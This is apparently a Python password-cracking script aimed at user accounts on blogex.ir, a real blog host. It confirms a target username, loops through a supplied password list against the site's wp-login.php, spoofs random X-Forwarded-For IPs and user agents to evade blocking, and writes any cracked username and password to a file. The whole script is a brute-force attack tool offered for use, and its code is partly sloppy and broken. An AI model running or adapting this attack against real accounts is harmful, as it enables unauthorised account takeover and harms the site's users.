#!/usr/bin/python
#----- the cracker bligex -----
import os,sys,time,random
#--------------------------
_author_ = 'Mř ŘōōŤ'
_version_ = '1.0.0'
_info_ = 'rubika.ir/TheServer'
#--------------------------
try:
	import requests
except:
	os.system("pip install requests")
	import requests
try:
    from bs4 import BeautifulSoup
except:
    os.system("pip install bs4")
    from bs4 import BeautifulSoup
try:
	import pyuseragents
except:
	os.system("pip install pyuseragents")
	import pyuseragents
try:
	import datetime
except:
	os.system("pip install datetime")
	import datetime
try:
	import pyfiglet
except:
	os.system("pip install pyfiglet")
	import pyfiglet
#------------------------------------
try:
	os.system("clear")
except:
	os.system("cls")
#-----------------------------
time.sleep(1)
logo = ['blogex','blogex . ir','BlOgEx','Blogex','CrAcKeR']
banner = (random.choice(logo))
bnr = pyfiglet.figlet_format(banner)
print('\033[93m')
for text in bnr:
    sys.stdout.write(text)
    sys.stdout.flush()
    time.sleep(0.01)
#.............................................
print('\n\n')
time.sleep(1)
date0 = (datetime.datetime.today())
#____________________________
try:
	date = os.system("date")
except:
	date = 'Wed, 29 Jun 2022 20'
#________________________
def login():
    global user
    global pas
    time.sleep(0.5)
    print ('\n\033[20;37mversion > '+_version_)
    time.sleep(0.7)
    print (f'\n[date] > {date0}\n\n')
    time.sleep(2)
    user = input('\033[31m[?] \033[93menter username not https \033[36m[#] > \033[20;37m')
    if 'http://' in user or 'https://' in user:
        time.sleep(1)
        print ('''\n\033[31m[!] \033[35mplz enter target don't [http]''')
        time.sleep(1)
        login()
    try:
	url = requests.get(f'http://{user}.blogex.ir')
    except:
	print('\n\033[31m[!] \033[35mserver offline')
	time.sleep(1)
	login()
    time.sleep(1)
    if url.status_code == 200:
        print (f"\n\n\033[31m[*] \033[36m @{user} FOUND\n\n")
    else:
        print (f"\n\n\033[31m[!] \033[35mPAGE NOT FOUND -> {user}\n\n")
        time.sleep(1)
        login()
    time.sleep(1)
    from pas import password
    password.password(user)
    ps = input ('\n\033[31m[?] \033[93menter your passwordlist \033[35m[name.txt]\033[36m [#] > \033[20;37m')
    time.sleep(1)
    try:
        pas = open(ps,'r').read().split()
    except:
        time.sleep(1)
        print ("\n\033[31m[!] \033[35mpasswordlist not found")
        ps = input ('\n\033[31m[?] \033[93menter your passwordlist \033[35m[name.txt]\033[36m [#] > \033[20;37m')
        pas = open(ps,'r').read().split()
#_________________________________
def sent():
    import requests,random
    from bs4 import BeautifulSoup
    global user
    global pas
    for _test_ in pas:
        iprandom = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        head = {'Host':'https://blogex.ir/','user-agent': pyuseragents.random(),'Content-Type':'application/x-www-form-urlencoded','cache-control':'no-cache, must-revalidate, max-age=0','content-encoding':'gzip','content-type':'text/html; charset=UTF-8','date': f'{date}','expires':'Wed, 11 Jan 1984 05','server':'Apache','status':'200','vary':'Accept-Encoding','x-frame-options':'SAMEORIGIN','X-Forwarded-For': iprandom}
        data = {'user_login': user, 'user_pass': _test_, 'wp-submit': 'ورود', 'redirect_to':'https://blogex.ir/wp-admin/','testcookie':'1'}
        request = requests.post("https://blogex.ir/wp-login.php",headers=head,data=data)
        requests = (request).text
        req = BeautifulSoup(requests,'html.parser')
        rq = str(req.find_all('i'))
        _req_ = F'خطا: رمز عبوری که برای نام کاربری {user} وارد شده درست نیست.'
        if _req_ in rq:
            time.sleep(0.7)
            print(f'\n\033[31m[!] \033[35mpassword not found => \033[92m{_test_}')
        if _req_ not in rq:
            time.sleep(1)
            print(f'\n\033[31m[*]\033[36m password found \033[92m= \033[20;37m[{_test_}]')
            time.sleep(1)
            with open('info.txt', 'w') as tr:
                tr.write('username ~> '+user+' password ~>' + _test_)
                print('\n\033[31m[*]\033[36m] info target saved in \033[93m<info.txt>')
                time.sleep(999)
                sys.exit()
#________________ the end _______________
_NAME_ = '_MAIN_'
if _NAME_ == '_MAIN_':
    login()
    sent()
